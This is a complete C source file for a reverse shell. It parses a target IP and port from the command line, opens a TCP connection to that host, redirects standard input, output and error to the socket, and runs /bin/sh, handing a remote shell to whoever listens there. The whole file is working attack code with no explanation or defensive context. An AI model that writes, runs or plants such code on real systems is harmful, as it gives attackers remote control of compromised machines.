#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char* argv[]){

    /* Create CLI interface with arguments */
    if (argc < 2) {
        printf("usage: %s [-h] IP PORT\n", argv[0]);
        printf("%s: error: the following arguments are required: IP, PORT\n", argv[0]);
        return 1; 
    }

    if (argc < 3) {
        printf("usage: %s [-h] PORT\n", argv[0]);
        printf("%s: error: the following arguments are required: PORT\n", argv[0]);
        return 1; 
    }

    if (argc > 3) {
        printf("usage: %s [-h] IP PORT\n", argv[0]);
        printf("%s: error: unrecognized arguments: ", argv[0]);
        for (int i = 3; i < argc; i++) {
            printf("%s ", argv[i]);
        }
        printf("\n");
        return 1; 
    }

    /* Parse arguments */
    char* ip_addr = argv[1];
    int port = atoi(argv[2]);

    /* Create a Network Socket */
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip_addr);

    /* Connect to remote Machine */
    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    /* Send reverse shell */
    char * const argv_sh[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv_sh, NULL);

    return 0;       
}
